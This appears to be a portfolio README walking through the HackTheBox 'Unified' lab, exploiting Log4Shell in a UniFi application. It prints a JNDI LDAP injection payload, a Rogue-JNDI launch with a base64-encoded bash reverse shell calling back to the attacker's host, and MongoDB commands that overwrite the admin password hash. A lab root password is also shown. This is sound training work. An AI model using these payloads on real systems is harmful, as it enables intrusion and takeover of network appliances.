
# Unified Machine Exploitation (Professional Penetration Test)

## Project Summary

The engagement on the HackTheBox “Unified” box successfully exploited a critical Log4Shell vulnerability (CVE-2021-44228) in the UniFi network application. The penetration test progressed systematically from initial reconnaissance to ultimate root privilege escalation. First, the target’s network services were enumerated using standard scanning tools, revealing the UniFi portal (version 6.4.54) on port 8443. This outdated version was vulnerable to the Apache Log4j RCE flaw. By intercepting the UniFi login API request and injecting a crafted JNDI payload, a reverse shell was obtained via a malicious LDAP server. Post-exploitation included accessing the MongoDB instance, manipulating the administrator’s password hash, and logging in to retrieve the root SSH credentials. The result of the test was the capture of both the user and root flags, demonstrating full compromise of the system. Key tools and techniques included Nmap scanning, Burp Suite interception, a Rogue-JNDI payload server, and MongoDB command-line manipulation.

## Introduction and Objectives

This test aimed to evaluate the security of a UniFi network management appliance by exploiting known vulnerabilities and escalating privileges to full system control. UniFi is known to embed a Java Log4j component; versions around 6.4.54 were documented to be susceptible to CVE-2021-44228, a remote code execution flaw in log4j (the so-called “Log4Shell”). 

The attack plan was to:
1. Identify open services and the application version.
2. Confirm and exploit the Log4j vulnerability to gain an initial shell.
3. Perform post-exploitation steps to obtain administrator and then root access.

Specifically, after initial access, the goal was to leverage the embedded MongoDB database to reset the UniFi administrator password and extract the root SSH password from the web interface. Throughout the engagement, strict ethical hacking practices and a structured methodology were followed to achieve these objectives.

## Tools and Technologies Used

- **Nmap:** Network port scanner for service enumeration.
- **Burp Suite & FoxyProxy:** Interception and modification of HTTP(S) requests.
- **Wireshark & Tcpdump:** Network packet sniffer to monitor incoming connections.
- **OpenJDK & Maven:** Tools to compile and run the Rogue-JNDI application.
- **Rogue-JNDI:** Malicious LDAP server toolkit.
- **Netcat (nc):** Network utility to listen for reverse shell callbacks.
- **MongoDB Tools:** Manipulation of the UniFi MongoDB instance for user database modification.
- **SSH:** Secure Shell for root access.

## Step-by-Step Attack Path

1. **Verify Connectivity:**
   - Command: `ping 10.129.134.224`
   - Confirmed the target system was reachable.

2. **Port Scanning:**
   - Command: `nmap -sC -sV 10.129.134.224`
   - Identified open ports and services (22, 6789, 8080, 8443).

3. **Access UniFi Portal:**
   - Identified the UniFi web UI (version 6.4.54) on port 8443.

4. **Intercept Login Request:**
   - Captured the `/api/login` POST request using Burp Suite.

5. **Prepare JNDI Payload:**
   - Crafted a malicious JNDI LDAP payload to exploit Log4Shell.

6. **Monitor LDAP Traffic:**
   - Used `wireshark & tcpdump` to confirm LDAP callbacks from the target machine.

7. **Trigger the Payload:**
   - Delivered the crafted request to trigger JNDI injection.

8. **Prepare Exploit Environment:**
   - Installed Java tools and built Rogue-JNDI.

9. **Catch the Shell:**
   - Used Netcat to obtain a reverse shell.

10. **Stabilize Shell:**
    - Promoted the raw shell to a fully interactive bash shell.

11. **Identify MongoDB:**
    - Connected to the UniFi MongoDB instance and queried the admin database.

12. **Change Admin Password:**
    - Updated the admin password hash using the `mongo` CLI tool.

13. **Login as Administrator:**
    - Logged in to the UniFi web interface with the new credentials.

14. **Retrieve Root Password:**
    - Extracted the root password from the UniFi admin interface.

15. **Capture Root Flag:**
    - Used SSH to access the target as root and captured the root flag.

## Skills Demonstrated

- **Reconnaissance & Enumeration:** Network scanning and service fingerprinting.
- **Web Application Testing:** HTTP request interception and manipulation.
- **Vulnerability Exploitation:** Delivered a JNDI/LDAP payload to exploit CVE-2021-44228.
- **Custom Payload Development:** Built Rogue-JNDI for remote code execution.
- **Privilege Escalation:** Manipulated the MongoDB database to gain admin credentials.
- **Post-Exploitation:** Used tools like Netcat and SSH for shell access and system control.

## Project Summary and Key Takeaways

In conclusion, the UniFi box was successfully compromised end-to-end. By exploiting a known Log4j RCE vulnerability, the team gained an initial shell and then escalated privileges to obtain administrator and root credentials. Each stage – from scanning and exploiting to database manipulation – validated the importance of thorough methodology and tool proficiency. 

**Personal Insights and Professional Growth:** This exercise reinforced my understanding of the Log4Shell vulnerability and practical exploit development. It also honed skills in chaining attack phases (reconnaissance, exploitation, escalation) in a realistic scenario. The experience of building and using Rogue-JNDI deepened my appreciation for payload automation tools, and manipulating MongoDB underscored the power of database interactions in post-exploitation.

---

**References:**
- [CVE-2021-44228](https://nvd.nist.gov)
- [Nmap](https://nmap.org)
- [Burp Suite](https://portswigger.net/burp)
- [Rogue-JNDI GitHub Repository](https://github.com/veracode-research/rogue-jndi)

  ## Step-by-Step Demonstration of My Hands-On Work
  ## Step 1
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e52e68b128a620ed65c04738e21c73e58d3a7e63/1%20ping%20ip.png)
  ```bash
  ping 10.129.134.224
  ```
  ## Step 2
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/778ac82dd156826c4ef9ad9ad167e86214f4d7a3/2%20nmap%20to%20scan.png)
  ```bash
  nmap -sC -sV 10.129.134.224
  ```
  ## Step 3
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/a35ebba3cb73160c40a184fc0046186921c4c788/3%20burpsuite%20browser.png)
  - Burp Suite open in Kali Linux.
  ## Step 4
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/c0a83c87026f32509d83b1156e472f22c04f6d2b/4%20unified%20with%20version%20.png)
  - Burp Suite web browser:
   ```bash
   https://10.129.134.224:8443/
   ```
   ## Step 5
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/acebcbb87264487110e7a17f327c3b31d5790e13/5%20unfied%20CVE%202021-44228.png)
  - CVE-2021-44228
  ## Step 6
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/ef90ff46fd5fe135296c98b162ec1954a9004633/6%20try%20to%20login%20deafult%20username%20and%20password%20but%20invalid%20usrname%20and%20password.png)
  - trying to log in with the default username and password.
  ## Step 7
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/6bf1dea4ce7b369741163516e0f126623784c855/7%20intercept%20the%20trafic%20with%20burpsuite%20and%20api%20login.png)
  - intercepting the traffic.
  ## Step 8
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/28f8cbcff80528874645a918c71e30663a51ad62/8%20right%20click%20api%20login%20to%20send%20to%20repeater.png)
  - Send to Repeater to get response.
  ## Step 9
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e22eb7b4b50e07b05d1ab07d99078ed088151630/9%20ifconfig%20to%20see%20tun0%20host%20ip.png)
  - Tun0 host IP
  ```bash
  ifconfig
  ```
  ## Step 10
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/1709021dbb59ca2e4df1f5dee83879fd81083883/10%20change%20the%20payload%20with%20host%20tun0%20host%20ip%20to%20see%20from%20wireshark%20.png)
  - Changing the malicious payload with the Tun0 host IP in the remember section vulnerable parameter. 
  ```bash
  "${jndi:ldap://10.10.16.87/whatever}",
  ```
  ## Step 11
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e4c62d1beca8d9482209d0bbae0db5622fda0f21/11%20tcp%20tun0%20and%20ldap%20deauflt%20port389%20to%20see%20source%20ip%20and%20distination%20.png)
  - After changing to a malicious payload, using Wireshark to analyze traffic on the LDAP default port 389.
  ## Step 12 
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e4c62d1beca8d9482209d0bbae0db5622fda0f21/12%20send%20the%20request%20again%20to%20see%20in%20wireshark%20.png)
  - Send the request again to confirm LDAP callbacks from the target machine.
  ## Step 13
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e4c62d1beca8d9482209d0bbae0db5622fda0f21/13%20host%20and%20target%20machine%20is%20talking%20eachother%20.png)
  - By examining the source and destination ports, I verified that communication between the host and target machines was established successfully.
  ## Step 14
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e4c62d1beca8d9482209d0bbae0db5622fda0f21/14%20tcpdump%20to%20analyze%20the%20trafic.png)
  - I also used tcpdump to analyze the traffic and confirmed that the host and target machines are communicating with each other. (It is not necessary to use both tcpdump and Wireshark; either tool can be used.)
  ```bash
  sudo tcpdump -i tun0 port 389
  ```
  ## Step 15
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e4c62d1beca8d9482209d0bbae0db5622fda0f21/15%20install%20openjdk-11-jdk.png)
  - Install openjdk
  ```bash
  sudo install openjdk-11-jdk -y
  ```
  ```bash
  java -version
  ```
  ## Step 16
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/6eac844362a947431c6d8a40e94c14f1c125bdd5/16%20install%20maven%20and%20see%20the%20version.png)
  - Install maven
  ```bash
  sudo apt-get install maven
  ```
  ```bash
  mvn -v
  ```
  ## Step 17
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/a0ab52c8e49a161bc98ee53a53f6ab3e9f5678a6/17%20Rogue-jndi%20copy%20from%20github%20to%20clone%20repo.png)
  - After installing the required package now need to download and build rogue-jndi.
  ```bash
  git clone https://github.com/veracode-research/rogue-jndi
  ```
  ## Step 18
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/ef2f63626698358e0707d80a6ec8e2b515503c11/18%20rogue-jndi%20package%20building%20.png)
  - rouge-jndi package building
  ```bash
  cd rogue-jndi
  ```
  ```bash
  mvn package
  ```
  ## Step 19
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/41164ddfc7edc3a334987fa26713c926befa8887/20%20copy%20that%20has%20file%20to%20create%20jar.png)
  - rogue-jndi is successfully built up
  ## Step 20
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/41164ddfc7edc3a334987fa26713c926befa8887/20%20copy%20that%20has%20file%20to%20create%20jar.png)
  - Using the Rogue-JNDI server requires creating a payload that, when delivered, provides shell access to the vulnerable system. To mitigate encoding errors, the payload will be encoded in Base64
  ```bash
  echo 'bash -c bash -i >&/dev/tcp/10.10.16.87/4444 0>&1' | base64
  ```
  ## Step 21
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/32083b372e7853eecb3a4f67e02e63cd5f4e7dd6/21%20rouge%20jndi%20made%20java-jar%20and%20target%20and%20copy%20that%20ldap%20mapping%20and%20repace%20it%20in%20remember%20section%20payload.png)
  - Once the payload is created, launch the Rogue-JNDI application by specifying the payload with the --command option and providing your tun0 IP address with the --hostname option.
  ```bash
  java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuODcvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.87"
  ```
  ## Step 22
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/bd584d47271bd7ceb170be8aaa2e159adc2643bf/22%20change%20the%20remember%20section%20payload%20and%20send%20the%20request%20to%20listen%20port%204444.png)
  - Returning to the intercepted POST request, modify the payload to ("${jndi:ldap://10.10.16.87:1389/o=tomcat}",) and then click Send
  ```bash
  "${jndi:ldap://10.10.16.87:1389/o=tomcat}",
  ```
  ## Step 23
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/4b44283c7e6ce95e6c6da6abbc3c2a389f028ae6/23%20nc%20-lvp%204444%20listening%20and%20identify%20unifi.png)
  - With the server now listening locally on port 389, open a new terminal and initiate a Netcat listener to capture the incoming reverse shell
  ```bash
  nc -lvp 4444
  ```
  ## Step 24
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/88962c1c0a9dab62dee9397c6cc5a9d4921dd071/24%20cd%20home%20michael%20found%20text%20file%20.png)
  - The command above upgrades our shell to an interactive session, enabling more effective interaction with the system. From there, we can navigate to /home/Michael/ and retrieve the user flag.
  ## Step 25
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/a4a2b7181238695b8f9c2f927bb5c17e6cf59ef2/25%20grep%20mongo.png)
  - According to the article, it is possible to access the UniFi application's administrator panel and potentially extract SSH secrets shared between devices. First, will verify whether MongoDB is running on the target system, as this could allow to retrieve credentials needed to access the administrative panel.
  ```bash
  ps aux | grep mongo
  ```
  # MongoDB is running on the target system on port 27117
  ## Step 26
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/9e969a4b3756e3196cf7df468d3e80e0fc890d79/26%20printjson%20to%20see%20all%20json%20file%20.png)
  - Interaction with the MongoDB service will be performed using the mongo command-line utility to attempt to extract the administrator password. A quick Google search for 'UniFi Default Database' reveals that the default database name for the UniFi application is ace.
  ```bash
  mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
  ```
  ## Step 27
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/0f7a07e4346bb6d3437b76ccdde4e4dbb0565394/27%20name%20email%20shadow%20hash.png)
  - The output reveals a user named Administrator. The password hash is stored in the x_shadow variable; however, in this case, it cannot be cracked using password-cracking utilities. Instead, the x_shadow password hash can be replaced with a custom-created hash to overwrite the administrator's password and authenticate to the administrative panel. This can be achieved by using the mkpasswd command-line utility.
  ## Step 28
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/c33ce49977252f33846c90aec1b9f68696fa9309/28%20mkp%20password%20hash.png)
  - The $ 6 $ prefix indicates that the SHA-512 hashing algorithm is being used; therefore, a hash of the same type must be generated.
  ```bash
  mkpasswd -m sha-512 Password1234
  ```
  ## Step 29
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/610a13d4935658e618b2ae2750344fd4df90465b/29%20mongo%20port%2027117%20connecting%20to%20mongodb.png)
  - Proceed to replace the existing hash with the newly created one.
  ```bash
  mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")}, {$set:{"x_shadow":"\$6\$I.TuKp1i1AmfrmCm\$fKnRc1UjEWK2a15jMlmh3tysvax6n3wsRtijYyFYM0QIcoDIyMCOy8DYqpBfiPXEvN8/6VbJwf7mpYUPpHdFH/"}})'
  ```
  ## Step 30
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/c969043f9f056c3f98835adb2434f7e6685ab8f5/30%20try%20to%20loging%20with%20username%20administrator%20and%20password%20is%20Password1234%20that%20i%20hash%20it%20out.png)
  - Next, visit the website and log in as the administrator. It is important to note that the username is case-sensitive.
  Username:
  ```bash
  administrator
  ```
  Password:
  ```bash
  Password1234
  ```
  ## Step 31
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/9ce949d390c974edaa84a6437c62b02edb42e339/31%20unified%20web%20is%20successfully%20login.png)
  - Authentication was successful, granting administrative access to the UniFi application.
  ## Step 32
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/633bdf63dca1232a6d3682f0e161f0d6e1648000/32%20unified%20setting%20section%20and%20see%20the%20root%20password.png)
  - UniFi provides an SSH Authentication feature, enabling the administration of other Access Points via SSH through a console or terminal.
  - Navigate to Settings → Site, then scroll down to locate the SSH Authentication option. SSH authentication using the root password is enabled.
  ## Step 33
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/c3c9e2e56ae9431fd1800834cdc532df595efdc1/33%20successfully%20can%20see%20the%20root%20password%20was%20NotACrackablePassword4U2022.png)
  - The page displays the root password in plaintext as NotACrackablePassword4U2022. Proceed to attempt authentication to the system as root via SSH.
   Username:
  ```bash
  root
  ```
  Password:
  ```bash
  NotACrackablePassword4U2022
  ```
  ## Step 34
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/9e4076daedcc16cef5c68acd4b71a2160048e28a/34%20root%20flag%20.png)
  - The connection was successful, and the root flag was found in /root.
  ```bash
  ssh root@10.129.134.224
  ```
  ```bash
  ls
  ```
   ```bash
  cat root.txt
  ```
  
  





  
  
  
